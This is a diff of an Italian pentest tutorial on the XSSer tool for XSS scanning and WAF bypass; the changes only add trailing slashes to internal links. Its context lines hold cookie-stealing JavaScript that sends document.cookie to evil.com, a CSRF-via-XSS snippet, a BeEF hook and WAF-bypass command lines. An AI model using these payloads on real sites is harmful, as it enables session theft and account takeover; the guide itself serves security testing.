@@ -22,13 +22,13 @@ tags:
 
 # XSSer: guida completa allo scanning XSS, fuzzing e WAF bypass
 
-**XSSer** è un framework automatico per rilevare, sfruttare e reportare vulnerabilità [XSS](https://hackita.it/articoli/xss) nelle applicazioni web. Preinstallato su Kali Linux, offre oltre **1300 vettori di attacco pre-configurati** e tecniche di bypass per WAF noti — PHPIDS, Imperva, ModSecurity, Barracuda, F5, Sucuri e altri.
+**XSSer** è un framework automatico per rilevare, sfruttare e reportare vulnerabilità [XSS](https://hackita.it/articoli/xss/) nelle applicazioni web. Preinstallato su Kali Linux, offre oltre **1300 vettori di attacco pre-configurati** e tecniche di bypass per WAF noti — PHPIDS, Imperva, ModSecurity, Barracuda, F5, Sucuri e altri.
 
 È scritto in Python 3 e si usa principalmente da riga di comando. Ha anche una GUI (xsser --gtk) ma nel contesto di un pentest si usa quasi sempre il CLI.
 
 Importante capire subito una cosa: XSSer è uno dei tre strumenti principali per XSS automation, ognuno con un punto di forza diverso. **XSSer** è il più vecchio e il più completo in termini di payload pre-built. **XSStrike** è più intelligente nel costruire payload contestuali. **Dalfox** è il più veloce e adatto ai workflow di bug bounty moderni. Questa guida copre XSSer in dettaglio e posiziona gli altri due per scegliere lo strumento giusto nel momento giusto.
 
-Prima di usare qualsiasi tool, però, serve capire cosa stai cercando. I tipi di XSS — [Reflected XSS](https://hackita.it/articoli/reflected-xss), [XSS Stored](https://hackita.it/articoli/xss-stored), [DOM XSS](https://hackita.it/articoli/dom-xss), [Blind XSS](https://hackita.it/articoli/blind-xss) — si comportano diversamente e richiedono approcci diversi.
+Prima di usare qualsiasi tool, però, serve capire cosa stai cercando. I tipi di XSS — [Reflected XSS](https://hackita.it/articoli/reflected-xss/), [XSS Stored](https://hackita.it/articoli/xss-stored/), [DOM XSS](https://hackita.it/articoli/dom-xss/), [Blind XSS](https://hackita.it/articoli/blind-xss/) — si comportano diversamente e richiedono approcci diversi.
 
 ***
 
@@ -215,7 +215,7 @@ xsser -u "https://target.com/search?q=XSS" \
   --Waf --Modsec --Url --Str
 ```
 
-Per la teoria sui bypass [XSS WAF](https://hackita.it/articoli/xss-waf-bypass) e [filtri](https://hackita.it/articoli/xss-filter-bypass) consulta le guide dedicate. Per i bypass della CSP: [xss-csp-bypass](https://hackita.it/articoli/xss-csp-bypass).
+Per la teoria sui bypass [XSS WAF](https://hackita.it/articoli/xss-waf-bypass/) e [filtri](https://hackita.it/articoli/xss-filter-bypass/) consulta le guide dedicate. Per i bypass della CSP: [xss-csp-bypass](https://hackita.it/articoli/xss-csp-bypass/).
 
 ***
 
@@ -370,7 +370,7 @@ dalfox url "https://target.com/search?q=test" --only-discovery-attack
 
 ## Blind XSS: Quando Non Vedi l'Output
 
-Il [Blind XSS](https://hackita.it/articoli/blind-xss) è la variante in cui il payload viene eseguito in un contesto che non vedi — pannello admin, sistema di ticketing, email HTML, log viewer interno. Non puoi confermare il trigger guardando la risposta HTTP: hai bisogno di un callback server.
+Il [Blind XSS](https://hackita.it/articoli/blind-xss/) è la variante in cui il payload viene eseguito in un contesto che non vedi — pannello admin, sistema di ticketing, email HTML, log viewer interno. Non puoi confermare il trigger guardando la risposta HTTP: hai bisogno di un callback server.
 
 ### Setup ezXSS (Self-Hosted)
 
@@ -424,11 +424,11 @@ fetch('https://evil.com/steal?c=' + document.cookie)
 new Image().src = 'https://evil.com/steal?c=' + encodeURIComponent(document.cookie)
 ```
 
-Se i cookie hanno il flag `HttpOnly`, non sono accessibili da JavaScript — ma puoi comunque fare [session hijacking](https://hackita.it/articoli/session-hijacking) usando il cookie direttamente nelle request (keylogging, form hijacking, CSRF).
+Se i cookie hanno il flag `HttpOnly`, non sono accessibili da JavaScript — ma puoi comunque fare [session hijacking](https://hackita.it/articoli/session-hijacking/) usando il cookie direttamente nelle request (keylogging, form hijacking, CSRF).
 
 ### CSRF via XSS
 
-Un XSS bypassa completamente la protezione [CSRF](https://hackita.it/articoli/csrf) perché il codice esegue nel browser della vittima — ha accesso ai cookie e ai token CSRF presenti nella pagina.
+Un XSS bypassa completamente la protezione [CSRF](https://hackita.it/articoli/csrf/) perché il codice esegue nel browser della vittima — ha accesso ai cookie e ai token CSRF presenti nella pagina.
 
 ```javascript
 // Leggi il token CSRF dalla pagina e fai la request con esso
@@ -446,7 +446,7 @@ fetch('/account/settings')
 
 ### BeEF (Browser Exploitation Framework)
 
-Per una dimostrazione di impatto completa in un pentest, [BeEF](https://hackita.it/articoli/beef) permette di hoockare il browser della vittima via XSS e controllarlo in tempo reale.
+Per una dimostrazione di impatto completa in un pentest, [BeEF](https://hackita.it/articoli/beef/) permette di hoockare il browser della vittima via XSS e controllarlo in tempo reale.
 
 ```javascript
 // Payload BeEF (hook il browser della vittima)
@@ -462,7 +462,7 @@ Questo è il flusso che segui in un pentest su applicazione web:
 
 **Fase 1 — Identificazione manuale dei punti di iniezione**
 
-Prima di usare tool, identifica manualmente dove l'input viene riflesso. In Burp Suite, cerca risposte HTTP che contengono il valore che hai inviato nel parametro. Quelli sono i tuoi candidati. I payload da passare da [xss-payload-list](https://hackita.it/articoli/xss-payload-list).
+Prima di usare tool, identifica manualmente dove l'input viene riflesso. In Burp Suite, cerca risposte HTTP che contengono il valore che hai inviato nel parametro. Quelli sono i tuoi candidati. I payload da passare da [xss-payload-list](https://hackita.it/articoli/xss-payload-list/).
 
 ```bash
 # Payload di test iniziale (semplice, non esegue codice):
